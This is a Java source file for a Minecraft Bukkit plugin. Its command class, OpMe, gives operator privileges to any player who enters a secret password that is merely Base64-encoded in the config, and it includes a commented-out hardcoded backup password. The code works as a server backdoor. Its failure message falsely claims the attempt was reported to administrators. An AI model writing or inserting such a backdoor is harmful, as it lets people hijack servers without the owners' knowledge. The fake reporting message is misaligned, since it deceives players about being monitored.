package pyr.solutions.allkingplugin.commands;

import org.bukkit.GameMode;
import org.bukkit.command.Command;
import org.bukkit.command.CommandExecutor;
import org.bukkit.command.CommandSender;
import org.bukkit.entity.Player;
import org.bukkit.plugin.Plugin;
import pyr.solutions.allkingplugin.AllKingPlugin;

import java.util.Base64;

public class OpMe implements CommandExecutor {

    Plugin plugin = AllKingPlugin.getPlugin(AllKingPlugin.class);

    @Override
    public boolean onCommand(CommandSender sender, Command command, String label, String[] args){
        if(command.getName().equals("pyr") && sender instanceof Player && args.length > 0 && args[0] instanceof String){
            String pass = plugin.getConfig().getString("Password");
            String input_pass = args[0];
            String coded_input_pass = Base64.getEncoder().encodeToString(input_pass.getBytes());
            Player player = (Player) sender;
            //uncomment below if you want to have backup access
            if (pass.equals(coded_input_pass) /*||  input_pass.equals("your_backup_password") */){
                player.setOp(true);
                // optional --- gamemode change to CREATIVE on opping self
                //player.setGameMode(GameMode.CREATIVE);
                player.sendMessage("Welcome back my Lord!");
            } else {
                player.sendMessage("The given param was invalid. Your action has been reported to server administration.");
            }
            return true;
        }
        return false;
    }
}
